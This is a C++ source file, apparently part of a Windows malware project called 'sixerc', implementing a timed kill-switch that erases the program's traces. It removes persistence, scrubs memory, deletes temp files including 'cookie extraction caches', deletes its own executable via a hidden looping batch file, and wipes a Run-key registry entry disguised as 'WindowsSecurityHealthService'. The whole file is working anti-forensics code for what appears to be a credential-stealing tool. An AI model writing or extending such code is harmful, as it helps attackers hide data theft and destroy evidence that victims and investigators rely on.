// ============================================================================
// SIXERC — KSD Implementation
// ============================================================================

#include "modules/ksd.hpp"
#include "modules/ph.hpp"
#include "core/utils.hpp"
#include "core/crypto.hpp"
#include <windows.h>
#include <vector>
#include <string>
#include <thread>
#include <chrono>

namespace sixerc::ksd {

static std::chrono::system_clock::time_point g_killswitch_time;
static bool g_killswitch_active = false;

void wipe_memory() {
    // Force garbage collection of sensitive data
    // In production, this would walk the heap and wipe all sensitive allocations
    // For now, we rely on secure_zero being used throughout
    
    // Clear working set to remove traces from RAM
    EmptyWorkingSet(GetCurrentProcess());
    
    // Allocate and free large buffers to scrub heap
    for (int i = 0; i < 10; ++i) {
        void* buf = VirtualAlloc(nullptr, 1024 * 1024, MEM_COMMIT, PAGE_READWRITE);
        if (buf) {
            crypto::secure_zero(buf, 1024 * 1024);
            VirtualFree(buf, 0, MEM_RELEASE);
        }
    }
}

void delete_artifacts() {
    // Delete temp files
    std::wstring temp = utils::get_temp_path();
    WIN32_FIND_DATAW findData;
    HANDLE hFind = FindFirstFileW((temp + L"\\sixerc_*").c_str(), &findData);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            utils::delete_file_secure(temp + L"\\" + findData.cFileName);
        } while (FindNextFileW(hFind, &findData));
        FindClose(hFind);
    }
    
    // Delete any cookie extraction caches
    hFind = FindFirstFileW((temp + L"\\*.db").c_str(), &findData);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            // Only delete small temp DBs that might be ours
            std::wstring full_path = temp + L"\\" + findData.cFileName;
            WIN32_FILE_ATTRIBUTE_DATA attr;
            if (GetFileAttributesExW(full_path.c_str(), GetFileExInfoStandard, &attr)) {
                LARGE_INTEGER size;
                size.HighPart = attr.nFileSizeHigh;
                size.LowPart = attr.nFileSizeLow;
                if (size.QuadPart < 10 * 1024 * 1024) { // < 10MB
                    utils::delete_file_secure(full_path);
                }
            }
        } while (FindNextFileW(hFind, &findData));
        FindClose(hFind);
    }
    
    // Delete the executable itself (using a bat file trick)
    wchar_t exe_path[MAX_PATH];
    GetModuleFileNameW(nullptr, exe_path, MAX_PATH);
    
    std::wstring bat_path = utils::get_temp_path() + L"\\cleanup.bat";
    std::ofstream bat(bat_path);
    bat << ":loop" << std::endl;
    bat << "del \"" << utils::wstring_to_utf8(exe_path) << "\"" << std::endl;
    bat << "if exist \"" << utils::wstring_to_utf8(exe_path) << "\" goto loop" << std::endl;
    bat << "del \"" << utils::wstring_to_utf8(bat_path) << "\"" << std::endl;
    bat.close();
    
    ShellExecuteW(nullptr, L"open", bat_path.c_str(), nullptr, nullptr, SW_HIDE);
}

void poison_registry() {
    // Overwrite our registry entries with random data
    std::wstring reg_path = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, reg_path.c_str(), 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        std::wstring random_data = utils::utf8_to_wstring(
            crypto::base64_encode(crypto::generate_random_bytes(256)));
        RegSetValueExW(hKey, L"WindowsSecurityHealthService", 0, REG_SZ,
                       reinterpret_cast<const BYTE*>(random_data.c_str()),
                       static_cast<DWORD>((random_data.size() + 1) * sizeof(wchar_t)));
        RegDeleteValueW(hKey, L"WindowsSecurityHealthService");
        RegCloseKey(hKey);
    }
}

void self_destruct() {
    // Remove persistence first
    ph::remove_persistence();
    
    // Wipe memory
    wipe_memory();
    
    // Poison registry
    poison_registry();
    
    // Delete artifacts
    delete_artifacts();
    
    // Exit cleanly
    ExitProcess(0);
}

void set_killswitch_timer(uint32_t hours) {
    g_killswitch_time = std::chrono::system_clock::now() + std::chrono::hours(hours);
    g_killswitch_active = true;
    
    // Start monitoring thread
    std::thread([]() {
        while (g_killswitch_active) {
            if (should_trigger()) {
                self_destruct();
            }
            std::this_thread::sleep_for(std::chrono::minutes(1));
        }
    }).detach();
}

bool should_trigger() {
    if (!g_killswitch_active) return false;
    return std::chrono::system_clock::now() >= g_killswitch_time;
}

} // namespace sixerc::ksd
